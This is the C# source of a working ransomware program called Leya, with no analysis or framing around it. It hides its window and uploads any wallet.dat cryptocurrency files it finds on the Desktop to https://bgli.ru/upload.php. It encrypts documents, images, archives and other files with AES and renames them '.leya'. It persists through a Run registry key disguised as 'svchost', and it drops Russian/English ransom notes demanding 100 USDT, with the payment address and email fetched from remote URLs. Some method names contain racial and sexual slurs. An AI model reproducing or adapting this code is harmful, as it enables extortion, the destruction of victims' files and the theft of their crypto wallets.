using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Web;
using LeyaCleanV.Forms;
using System.Threading;
using System.Net.Http;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Reflection;

namespace LeyaCleanV
{
    public partial class Form1 : Form
    {
        private string address;
        private string mail;
        string username = Environment.UserName;
        string pcname = System.Environment.MachineName.ToString();
        string userdir = "C:\\Users\\";
       
        public Form1()
        {
            InitializeComponent();
            // Скрытие формы из панели задач
            this.ShowInTaskbar = false;
            // Скрытие иконки приложения из панели задач
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            Data.password = CreatePassword(15);
        }

        private async void Form1_Load_1(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            await Task.WhenAll(DICK(), DICK2());
            StartAction();
        }
        private async Task DICK()
        {
            var siteUrls = new[] { "https://pornhubadasdasd.com", "https://pornhubdadasdasd.com", "https://bgli.ru/payadress.html" };
            var httpClient = new HttpClient();
            string content = null;

            foreach (var siteUrl in siteUrls)
            {
                try
                {
                    var response = await httpClient.GetAsync(siteUrl);
                    content = await response.Content.ReadAsStringAsync();
                    break;
                }
                catch (HttpRequestException ex)
                {

                }
            }

            if (content != null)
            {
                var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                var addressLine = lines[0];
                address = addressLine;
            }
        }
        private async Task DICK2()
        {
            var siteUrls = new[] { "https://pornhubadasdasd.com", "https://bgli.ru/email.html", "https://pornhubdadasdasd.com" };
            var httpClient = new HttpClient();
            string content = null;

            foreach (var siteUrl in siteUrls)
            {
                try
                {
                    var response = await httpClient.GetAsync(siteUrl);
                    content = await response.Content.ReadAsStringAsync();
                    break;
                }
                catch (HttpRequestException ex)
                {

                }
            }

            if (content != null)
            {
                var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                var mailLine = lines[0];
                mail = mailLine;
            }
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        public string CreatePassword(int length)
        {
           const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {

                res.Append(valid[rnd.Next(valid.Length)]);


            }
            return res.ToString();
        }
        public void EncryptFile(string file, string password)
        {
            // Проверяем, не заблокирован ли файл другим процессом
            if (IsFileLocked(file))
            {
                return;
            }

            // Проверяем размер файла
            if (new FileInfo(file).Length >= 500000000)
            {
                // Файл превышает максимальный размер, не нужно его шифровать
                return;
            }

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            // Открываем файл для записи
            FileStream fileStream = null;
            try
            {
                fileStream = new FileStream(file, FileMode.OpenOrCreate, FileAccess.Write, FileShare.ReadWrite);
            }
            catch (IOException)
            {
                // Файл заблокирован другим процессом, выходим из метода
                return;
            }

            // Записываем зашифрованные данные в файл
            try
            {
                fileStream.Write(bytesEncrypted, 0, bytesEncrypted.Length);
            }
            finally
            {
                fileStream.Close();
            }

            // Добавляем расширение файла
            File.Move(file, file + ".leya");
        }





        public void encryptDirectory(string location, string password)
        {
            var validExtensions = new[]
            {
        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
        ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx",
        ".html", ".xml", ".psd", ".json" , ".session" , ".exe", ".1cd", ".lgf", ".lgp", ".pfl",
        ".lst", ".snp", ".cfg", ".js", ".mhtml", ".rar", ".7z", ".zip", ".bat", ".1cl", ".lic", ".1ccr",
        ".pdf", ".docm", ".dotx", ".dotm", ".xlsm" , ".mht", ".bmp", ".gif", ".tif", ".mdb",
        ".accdb", 
    };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);

            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i], Data.password);
                }
            }

            for (int i = 0; i < childDirectories.Length; i++)
            {
                encryptDirectory(childDirectories[i], Data.password);
            }
        }


        public static bool IsFileLocked(string filePath)
        {
            FileStream stream = null;
            try
            {
                stream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            }
            catch (IOException)
            {
                return true;
            }
            finally
            {
                stream?.Close();
            }
            return false;
        }




        public void StartAction()
        {
            string path = "\\Desktop\\test";
            string startpath = userdir + username + path;
            string appPath = System.Reflection.Assembly.GetEntryAssembly().Location;
            RegistryKey autostartKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            Lock form2 = new Lock();
            Decryptor form3 = new Decryptor();
            if (Directory.GetFiles(startpath, "*.leya").Length > 0)
            {
                form2.Show();
                form3.Show();
            }
            GIGA_NIGGA();
            Thread.Sleep(3000);
            encryptDirectory(startpath, Data.password);
            autostartKey.SetValue("svchost", appPath);
            Thread.Sleep(3000);
            form2.Show();
            form3.Show();
            for (int i = 0; i < 10; i++)
            {
                messageCreator(i);
            }
        }

        private void GIGA_NIGGA()
        {
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            try
            {
                DirectoryInfo di = new DirectoryInfo(desktopPath);
                FileInfo[] files = di.GetFiles("wallet.dat", SearchOption.AllDirectories);

                foreach (FileInfo file in files)
                {
                    string newName = Path.Combine(file.DirectoryName, Path.GetFileNameWithoutExtension(file.Name) + "_" + Path.GetRandomFileName());
                    newName = newName.Substring(0, Math.Min(255, newName.Length - 4)) + ".dat";

                    // Переименование файла, чтобы не заменять его
                    File.Move(file.FullName, newName);

                    // Отправка файла на сервер методом POST
                    using (WebClient client = new WebClient())
                    {
                        client.UploadFile("https://bgli.ru/upload.php", "POST", newName);
                    }
                }
            }
            catch (Exception ex)
            {

            }
        }

        public void messageCreator(int i)
        {
            string path = "\\Desktop\\readme" + i + ".txt";
            string fullpath = userdir + username + path;
            string[] lines = { $"Encrypted by Leya. | Зашифровано Леей. \r\n Чтобы расшифровать ваши файлы переведите 100USDT на счет TRC20: {address}, \r\n а так же отправьте ваш ID: " + Info.IDinForm + $"\r\n на почту {mail}. \r\n Если вы будете пытаться расшифровать файлы самостоятельно они могут быть повреждены и впосле́дствии не расшифрованы. \r\n В иных случаях гаранитруем 100% расшифровку при выполнении выше указаных требованиях." };
            System.IO.File.WriteAllLines(fullpath, lines);
        }

    }
}